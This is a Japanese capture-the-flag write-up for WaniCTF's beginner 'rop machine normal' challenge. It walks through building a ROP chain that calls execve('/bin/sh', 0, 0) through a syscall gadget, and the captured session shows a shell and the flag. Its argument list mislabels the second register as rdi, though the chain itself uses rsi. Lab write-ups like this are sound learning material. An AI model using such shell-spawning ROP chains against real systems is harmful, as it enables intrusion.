# rop machine normal (202pt Easy)
# 問題文
`nc rop-normal.pwn.wanictf.org 9004`
## ヒント
- ropでexecve("/bin/sh", 0, 0)を実行して下さい。
- "/bin/sh"のアドレスは提供されています
- execveのsyscall番号は0x3bです。
- rop machineの使い方->wani-hackase/rop-machine

## 使用ツール例
- netcat (nc)

## gccのセキュリティ保護
- Partial RELocation ReadOnly (RELRO)
- Stack Smash Protection (SSP)有効
- No eXecute bit(NX)有効
- Position Independent Executable (PIE)無効

# やったこと

```
 nc rop-normal.pwn.wanictf.org 9004

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "pop rsi; ret" addr
4. append "pop rdx; ret" addr
5. append "pop rax; ret" addr
6. append "syscall; ret" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 
```

スタックに命令を追加して最後に実行すれば良いっぽいです．

問題文から`execve("/bin/sh", 0, 0)`が実行できればいいことが分かります．

https://www.mztn.org/lxasm64/x86_x64_table.html
等を見ると，
- raxに0x3b (システムコール番号)
- rdiに"/bin/sh" (第一引数)
- rdiに0 (第二引数)
- rdxに0 (第三引数)

を指定した状態でsyscallを実行すれば`execve("/bin/sh", 0, 0)`が実行されるようです．

```
 nc rop-normal.pwn.wanictf.org 9004

"/bin/sh" address is 0x404070

...

> 0
     rop_arena
+--------------------+
| pop rax; ret       |<- rop start
+--------------------+
| 0x000000000000003b |
+--------------------+
| pop rdi; ret       |
+--------------------+
| 0x0000000000404070 |
+--------------------+
| pop rsi; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| pop rdx; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| syscall; ret       |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt 
FLAG{now-you-can-call-any-system-calls-with-syscall}
```

上の用に設定して実行するとshellが得られました．

# フラグ
FLAG{now-you-can-call-any-system-calls-with-syscall}

# メモ
pwnは超初心者なので間違ってるところがあるかも．